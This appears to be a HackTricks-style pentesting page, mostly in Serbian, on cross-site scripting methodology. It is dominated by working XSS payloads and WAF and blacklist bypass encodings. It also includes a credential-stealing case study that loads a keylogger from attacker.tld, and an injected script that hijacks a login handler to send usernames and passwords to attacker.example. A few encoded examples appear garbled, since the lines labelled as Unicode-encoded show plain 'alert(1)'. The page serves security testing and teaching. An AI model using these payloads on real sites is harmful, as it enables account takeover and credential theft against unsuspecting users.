# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## Metodologija

1. Proverite da li je **bilo koja vrednost koju kontrolišete** (_parameters_, _path_, _headers_?, _cookies_?) **reflektovana** u HTML-u ili **koristi** je **JS** kod.
2. **Pronađite kontekst** u kome je reflektovana/koristi se.
3. Ako je **reflektovana**
1. Proverite **koje simbole možete koristiti** i u zavisnosti od toga, pripremite payload:
1. U **raw HTML**:
1. Možete li kreirati nove HTML tagove?
2. Možete li koristiti events ili atribute koji podržavaju `javascript:` protokol?
3. Možete li zaobići zaštite?
4. Da li se HTML sadržaj interpretira od strane nekog client side JS engine-a (_AngularJS_, _VueJS_, _Mavo_...), možete zloupotrebiti [**Client Side Template Injection**](../client-side-template-injection-csti.md).
5. Ako ne možete kreirati HTML tagove koji izvršavaju JS kod, možete li zloupotrebiti [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html)?
2. Unutar **HTML taga**:
1. Možete li izaći u raw HTML kontekst?
2. Možete li kreirati nove events/atribute za izvršenje JS koda?
3. Da li atribut u kome ste zatvoreni podržava izvršenje JS-a?
4. Možete li zaobići zaštite?
3. Unutar **JavaScript koda**:
1. Možete li escape-ovati `<script>` tag?
2. Možete li escape-ovati string i izvršiti drugi JS kod?
3. Da li je vaš input u template literalima \`\`?
4. Možete li zaobići zaštite?
4. Javascript **funkcija** koja se **izvršava**
1. Možete navesti ime funkcije koja će se izvršiti. npr.: `?callback=alert(1)`
4. Ako je **koristi**:
1. Možete eksploatisati **DOM XSS**, obratite pažnju kako je vaš input kontrolisan i da li se vaš **kontrolisani input koristi od strane nekog sink-a.**

Kada radite na kompleksnom XSS-u može vam biti korisno da znate o:

{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Reflektovane vrednosti

Da biste uspešno eksploatisali XSS, prva stvar koju treba da pronađete je **vrednost koju kontrolišete i koja je reflektovana** na web stranici.

- **Intermediately reflected**: Ako otkrijete da je vrednost parametra ili čak path-a reflektovana na web stranici, možete iskoristiti **Reflected XSS**.
- **Stored and reflected**: Ako otkrijete da je vrednost koju kontrolišete sačuvana na serveru i reflektovana svaki put kada pristupite stranici, možete iskoristiti **Stored XSS**.
- **Accessed via JS**: Ako otkrijete da se vrednost koju kontrolišete pristupa putem JS-a, možete iskoristiti **DOM XSS**.

## Konteksti

Kada pokušavate da iskoristite XSS, prvo što treba da znate je **gde se vaš input reflektuje**. U zavisnosti od konteksta, moći ćete da izvršite proizvoljan JS kod na različite načine.

### Raw HTML

Ako je vaš input **reflektovan u raw HTML-u** stranice, biće potrebno da zloupotrebite neki **HTML tag** da biste izvršili JS kod: `<img , <iframe , <svg , <script` ... ovo su samo neki od mnogih mogućih HTML tagova koje možete koristiti.\
Takođe, imajte na umu [Client Side Template Injection](../client-side-template-injection-csti.md).

### Unutar atributa HTML taga

Ako je vaš input reflektovan unutar vrednosti atributa taga, možete pokušati:

1. Da **escape-ujete atribut i tag** (tada ćete biti u raw HTML-u) i kreirate novi HTML tag za zloupotrebu: `"><img [...]`
2. Ako **možete escape-ovati iz atributa ali ne iz taga** (`>` je enkodovan ili obrisan), u zavisnosti od taga možete **kreirati event** koji izvršava JS kod: `" autofocus onfocus=alert(1) x="`
3. Ako **ne možete escape-ovati iz atributa** (`"` se enkoduje ili briše), onda u zavisnosti od **koji atribut** sadrži vašu vrednost i **da li kontrolišete celu vrednost ili samo njen deo** bićete u mogućnosti da ga zloupotrebite. Na **primer**, ako kontrolišete event poput `onclick=` moći ćete da naterate da izvrši proizvoljni kod kada se klikne. Još jedan interesantan **primer** je atribut `href`, gde možete koristiti `javascript:` protokol da izvršite proizvoljni kod: **`href="javascript:alert(1)"`**
4. Ako je vaš input reflektovan unutar "**unexpoitable tags**" možete pokušati trik sa **`accesskey`** da zloupotrebite ranjivost (biće vam potrebna neka socijalna inženjering da to eksploatišete): **`" accesskey="x" onclick="alert(1)" x="`**

#### Attribute-only login XSS iza WAF-ova

Korporativna SSO login stranica reflektovala je OAuth `service` parameter unutar `href` atributa `<a id="forgot_btn" ...>`. Iako su `<` i `>` bili HTML-enkodovani, double quotes nisu bili, tako da je napadač mogao da zatvori atribut i ponovo iskoristi isti element za injektovanje handler-a kao što je `" onfocus="payload" x="`.

1. **Injektovanje handler-a:** Jednostavni payload-i poput `onclick="print(1)"` su blokirani, ali je WAF inspektovao samo prvu JavaScript izjavu u inline atributima. Prefiksiranje bezopasnog izraza u zagradama, pa tačka-zarez, dozvolilo je pravom payload-u da se izvrši: `onfocus="(history.length);malicious_code_here"`.
2. **Automatsko okidanje:** Browseri fokusiraju bilo koji element čiji id odgovara fragmentu, tako da dodavanjem `#forgot_btn` na URL exploit-a forsira anchor da dobije fokus pri učitavanju stranice i pokrene handler bez potrebe za klikom.
3. **Držite inline stub malim:** Meta je već koristila jQuery. Handler je samo trebao da bootstrap-uje zahtev preko `$.getScript(...)` dok je kompletan keylogger živeo na serveru napadača.

**Building strings without quotes**

Single quotes su vraćane URL-enkodovane, a escapovane double quotes su korumpirale atribut, pa je payload generisao svaki string pomoću `String.fromCharCode`. Pomoćna funkcija olakšava konverziju bilo kog URL-a u char kodove pre nego što ga nalepite u atribut:
```javascript
function toCharCodes(str){
return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```
Rezultujući atribut je izgledao ovako:
```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```
**Zašto ovo krade podatke za prijavu**

Eksterni skript (učitan sa hosta koji kontroliše napadač ili Burp Collaborator) je povezao `document.onkeypress`, beležio pritiske tastera i svake sekunde pozivao `new Image().src = collaborator_url + keys`. Pošto se XSS aktivira samo za neautentifikovane korisnike, osetljiva radnja je sam formular za prijavu — napadač snima pritiske tastera za korisnička imena i lozinke čak i ako žrtva nikada ne pritisne "Login".

Neobičan primer Angular-a koji izvršava XSS ako kontrolišete ime klase:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### Unutar JavaScript koda

U ovom slučaju vaš unos se reflektuje između **`<script> [...] </script>`** tagova HTML stranice, unutar `.js` fajla ili unutar atributa koji koristi **`javascript:`** protokol:

- Ako se reflektuje između **`<script> [...] </script>`** tagova, čak i ako je vaš unos unutar bilo kakvih navodnika, možete pokušati da injektujete `</script>` i pobegnete iz tog konteksta. Ovo radi zato što će **pregledač prvo parsirati HTML tagove** pa tek onda sadržaj, zato neće primetiti da je vaš injektovani `</script>` tag unutar HTML koda.
- Ako je reflektovano **unutar JS stringa** i prethodni trik ne radi, moraćete da **izađete** iz stringa, **izvršite** vaš kod i **rekonstrušete** JS kod (ako ima bilo kakve greške, neće biti izvršen:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- Ako se reflektuje unutar template literals možete **ugraditi JS izraze** koristeći `${ ... }` sintaksu: `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode enkodiranje** radi za pisanje **validnog JavaScript koda**:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting označava mogućnost da **deklarишete funkcije, varijable ili klase nakon što su korišćene, što vam omogućava da iskoristite scenarije gde XSS koristi nedeclarisane varijable ili funkcije.**\
**Pogledajte sledeću stranicu za više informacija:**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

Several web pages have endpoints that **accept as parameter the name of the function to execute**. A common example to see in the wild is something like: `?callback=callbackFunc`.

Dobar način da otkrijete da li se nešto što korisnik direktno prosleđuje pokušava izvršiti je **izmeniti vrednost parametra** (na primer u 'Vulnerable') i pogledati u konzoli za greške poput:

![](<../../images/image (711).png>)

Ako je ranjivo, mogli biste uspeti da **pokrenete alert** jednostavnim slanjem vrednosti: **`?callback=alert(1)`**. Međutim, veoma je često da ovi endpoints **validiraju sadržaj** tako da dozvole samo slova, brojeve, tačke i donje crte (**`[\w\._]`**).

Ipak, čak i sa tom ograničenjem i dalje je moguće izvršiti neke akcije. To je zato što možete koristiti te dozvoljene karaktere da **pristupite bilo kom elementu u DOM-u**:

![](<../../images/image (747).png>)

Neke korisne funkcije za ovo:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Takođe možete pokušati da **pokrenete Javascript functions** direktno: `obj.sales.delOrders`.

Međutim, obično endpointi koji izvršavaju naznačenu funkciju nemaju mnogo zanimljivog DOM-a; **druge stranice iste origin** će imati **zanimljiviji DOM** za izvođenje više akcija.

Zbog toga, da bi se **iskoristila ova ranjivost u drugačijem DOM-u**, razvijen je exploit **Same Origin Method Execution (SOME)**:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

Postoji **JS code** koja **nesigurno** koristi neke **podatke koje kontroliše napadač**, kao što je `location.href`. Napadač bi to mogao iskoristiti za izvršavanje proizvoljnog JS koda.


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

Ovakve vrste XSS mogu se naći **bilo gde**. One ne zavise samo od klijentske eksploatacije web aplikacije već od **bilo kog** **konteksta**. Ovakvo **izvršavanje proizvoljnog JavaScript-a** može se čak iskoristiti za dobijanje **RCE**, **čitati** **proizvoljne** **fajlove** na klijentima i serverima, i još mnogo toga.\
Nekoliko **primerа**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Umetanje unutar raw HTML-a

Kada se vaš unos reflektuje **inside the HTML page** ili možete escape-ovati i ubaciti HTML kod u ovom kontekstu, **prva** stvar koju treba da uradite je da proverite da li možete zloupotrebiti `<` za kreiranje novih tagova: jednostavno pokušajte da **reflektujete** taj **char** i proverite da li je **HTML encoded** ili **deleted** ili je **reflected without changes**. **Samo u poslednjem slučaju bićete u mogućnosti da iskoristite ovu situaciju**.\
Za ove slučajeve takođe **imajte na umu** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Napomena: A HTML comment can be closed using\*\***\***\*`-->`\*\***\***\*or \*\***`--!>`\*\*_ 

U ovom slučaju, i ako se ne koristi black/whitelisting, možete koristiti payloads kao:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
Međutim, ako se koristi black/whitelisting tagova/atributa, moraćete da **brute-force koje tagove** možete kreirati.\
Kada ste **otkrili koje tagove je dozvoljeno koristiti**, moraćete da **brute-force atribute/događaje** unutar pronađenih validnih tagova kako biste videli kako možete napasti kontekst.

### Brute-force tagova/događaja

Otiđite na [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) i kliknite na _**Copy tags to clipboard**_. Zatim pošaljite sve njih koristeći Burp intruder i proverite da li neki tagovi nisu označeni kao maliciozni od strane WAF-a. Kada otkrijete koje tagove možete iskoristiti, možete **brute-force sve događaje** koristeći validne tagove (na istoj stranici kliknite na _**Copy events to clipboard**_ i sledite istu proceduru kao ranije).

### Prilagođeni tagovi

Ako niste pronašli nijedan validan HTML tag, možete pokušati da **kreirate prilagođeni tag** i izvršite JS kod sa atributom `onfocus`. U XSS zahtevu, potrebno je završiti URL sa `#` da bi stranica **fokusirala taj objekat** i **izvršila** kod:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

Ako se koristi neka vrsta blacklist-a, možete pokušati da je bypass-ujete nekim glupim trikovima:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **Više tiny XSS za različita okruženja** payload [**može se naći ovde**](https://github.com/terjanq/Tiny-XSS-Payloads) i [**ovde**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
Poslednji koristi 2 Unicode karaktera koji se proširuju na 5: telsr\
More of these characters can be found [here](https://www.unicode.org/charts/normalization/).\
To check in which characters are decomposed check [here](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

Ako, da biste iskoristili ranjivost, treba da **korisnik klikne na link ili na formu** sa unapred popunjenim podacima, možete pokušati [**abuse Clickjacking**](../clickjacking.md#xss-clickjacking) (ako je stranica ranjiva).

### Impossible - Dangling Markup

Ako mislite da je **nemoguće kreirati HTML tag sa atributom koji izvršava JS kod**, treba da proverite [**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html) jer biste mogli **iskoristiti** ranjivost **bez** izvršavanja **JS** koda.

## Injecting inside HTML tag

### Unutar taga/escape iz vrednosti atributa

Ako ste **unutar HTML taga**, prva stvar koju možete pokušati je da **escape** iz taga i upotrebite neke od tehnika pomenutih u [previous section](#injecting-inside-raw-html) da izvršite JS kod.\
Ako **ne možete escape-ovati iz taga**, možete kreirati nove atribute unutar taga da pokušate da izvršite JS kod, na primer koristeći neki payload kao (_note that in this example double quotes are use to escape from the attribute, you won't need them if your input is reflected directly inside the tag_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Događaji stila**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### Unutar atributa

Čak i ako **ne možete da pobegnete iz atributa** (`"` se enkodira ili briše), u zavisnosti od **u kojem atributu** se vaša vrednost reflektuje i **da li kontrolišete celu vrednost ili samo njen deo** moći ćete to zloupotrebiti. Na **primer**, ako kontrolišete event kao što je `onclick=` moći ćete da naterate da izvrši proizvoljan kod kada se klikne.\
Još jedan zanimljiv **primer** je atribut `href`, gde možete da koristite `javascript:` protokol da izvršite proizvoljan kod: **`href="javascript:alert(1)"`**

**Zaobilaženje unutar event-a koristeći HTML enkodiranje/URL encode**

Takvi **HTML enkodovani karakteri** unutar vrednosti atributa HTML tagova se **dekodiraju u runtime-u**. Dakle, nešto kao sledeće biće validno (payload je u boldu): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Imajte na umu da je **bilo koja vrsta HTML enkodiranja validna**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Imajte na umu da URL encode takođe radi:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Bypass unutar događaja koristeći Unicode enkodiranje**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Posebni protokoli unutar atributa

Tamo možete koristiti protokole **`javascript:`** ili **`data:`** na nekim mestima da biste **izvršili proizvoljan JS kod**. Neki će zahtevati interakciju korisnika, neki neće.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Mesta gde možete da ubacite ove protokole**

**Uopšteno** `javascript:` protokol može biti **korišćen u bilo kom tagu koji prihvata atribut `href`** i u **većini** tagova koji prihvataju **atribut `src`** (ali ne `<img>`)
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Ostali trikovi obfuskacije**

_**U ovom slučaju HTML enkodiranje i Unicode enkodiranje iz prethodnog odeljka takođe važe jer se nalazite unutar atributa.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Štaviše, postoji još jedan **koristan trik** za ove slučajeve: **Čak i ako je vaš unos unutar `javascript:...` URL encoded, biće URL decoded pre nego što bude izvršen.** Dakle, ako treba da **escape** iz **string** koristeći **single quote** i vidite da je **URL encoded**, zapamtite da **to nije važno,** biće **interpretirano** kao **single quote** tokom **izvršavanja**.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Imajte na umu da ako pokušate da **koristite oba** `URLencode + HTMLencode` u bilo kom redosledu da enkodujete **payload**, to **neće** **raditi**, ali možete **mešati ih unutar payload-a**.

**Korišćenje Hex i Octal encode sa `javascript:`**

Možete koristiti **Hex** i **Octal encode** unutar `src` atributa `iframe` (barem) da deklarisete **HTML tags to execute JS**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
Ako možete injektovati bilo koji URL u proizvoljan **`<a href=`** tag koji sadrži atribute **`target="_blank" and rel="opener"`**, pogledajte **sledeću stranicu da biste iskorištili ovo ponašanje**:

{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### Zaobilaženje 'on' event handlers

Pre svega proverite ovu stranicu ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) za korisne **"on" event handlers**.\
U slučaju da postoji neka blacklist koja vam sprečava kreiranje ovih event handlers, možete pokušati sledeće bypasses:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS u „neiskorišćivim tagovima“ (hidden input, link, canonical, meta)

Iz [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **sada je moguće zloupotrebiti hidden inputs pomoću:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
I u **meta tagovima**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
Iz [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): Možete izvršiti **XSS payload inside a hidden attribute**, pod uslovom da možete **nagovoriti** **žrtvu** da pritisne **kombinaciju tastera**. U Firefoxu na Windows/Linux kombinacija tastera je **ALT+SHIFT+X**, a na OS X je **CTRL+ALT+X**. Možete odrediti drugu kombinaciju tastera koristeći drugi taster u access key atributu. Evo vektora:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**The XSS payload will be something like this: `" accesskey="x" onclick="alert(1)" x="`**

### Blacklist Bypasses

Several tricks with using different encoding were exposed already inside this section. Go **back to learn where can you use:**

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

Pročitajte [Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Bypasses for JavaScript code**

Pročitajte [JavaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

If you found a **XSS in a very small part** of the web that requires some kind of interaction (maybe a small link in the footer with an onmouseover element), you can try to **modify the space that element occupies** to maximize the probabilities of have the link fired.

For example, you could add some styling in the element like: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

But, if the WAF is filtering the style attribute, you can use CSS Styling Gadgets, so if you find, for example

> .test {display:block; color: blue; width: 100%\}

and

> \#someid {top: 0; font-family: Tahoma;}

Now you can modify our link and bring it to the form

> \<a href="" id=someid class=test onclick=alert() a="">

Ovaj trik je preuzet sa [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Injecting inside JavaScript code

In these case you **input** is going to be **reflected inside the JS code** of a `.js` file or between `<script>...</script>` tags or between HTML events that can execute JS code or between attributes that accepts the `javascript:` protocol.

### Escaping \<script> tag

If your code is inserted within `<script> [...] var input = 'reflected data' [...] </script>` you could easily **escape closing the `<script>`** tag:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Imajte na umu da u ovom primeru mi **nismo čak ni zatvorili jednostruki navodnik**. To je zato što **HTML parsiranje prvo obavlja pregledač**, što podrazumeva identifikovanje elemenata stranice, uključujući blokove skripti. Parsiranje JavaScript-a da bi se razumele i izvršile ugrađene skripte obavlja se tek potom.

### Unutar JS koda

Ako se `<>` sanitizuju i dalje možete **prekinuti string** tamo gde je vaš unos **smešten** i **izvršiti proizvoljan JS**. Važno je **popraviti JS sintaksu**, jer ako postoje greške, JS kod se neće izvršiti:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

Kada korisnički unos dospe unutar quoted JavaScript stringa (npr. server-side echo u inline script), možete prekinuti string, inject code i repair the syntax kako bi parsiranje ostalo ispravno. Generički skelet:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
Primer URL obrasca kada je ranjiv parametar reflektovan u JS string:
```
?param=test";<INJECTION>;a="
```
Ovo izvršava attacker JS bez potrebe da se pristupa HTML kontekstu (pure JS-in-JS). Kombinujte sa blacklist bypasses ispod kada filteri blokiraju ključne reči.

### Literali predložaka ``

Da biste konstruisali **stringove**, pored jednostrukih i dvostrukih navodnika, JS takođe prihvata **backticks** **` `` `**. Ovo je poznato kao literali predložaka jer omogućavaju **ugrađene JS izraze** koristeći `${ ... }` sintaksu.\ Stoga, ako primetite da je vaš unos **reflektovan** unutar JS stringa koji koristi backticks, možete zloupotrebiti sintaksu `${ ... }` da izvršite **proizvoljan JS kod**:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### Kodirano code execution
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### Deliverable payloads sa eval(atob()) i nijansama scope-a

Da biste zadržali URL-ove kraćim i zaobišli naivne filtre po ključnim rečima, možete enkodovati vašu pravu logiku u base64 i izvršiti je pomoću `eval(atob('...'))`. Ako jednostavno filtriranje po ključnim rečima blokira identifikatore poput `alert`, `eval`, ili `atob`, koristite Unicode-escaped identifikatore koji se kompajliraju identično u browseru, ali izbegavaju filtere koji rade poređenje stringova:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
Važna nijansa u opsegu: `const`/`let` deklarisani unutar `eval()` su block-scoped i NE kreiraju globals; neće biti dostupni kasnijim skriptama. Koristite dinamički ubačen `<script>` element da definišete global, non-rebindable hooks kada je potrebno (npr. da hijack-ujete form handler):
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
Referenca: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Unicode Encode JS izvršavanje
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript bypass blacklists tehnike

**Stringovi**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Posebni escape-ovi**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**Zamene razmaka unutar JS koda**
```javascript
<TAB>
/**/
```
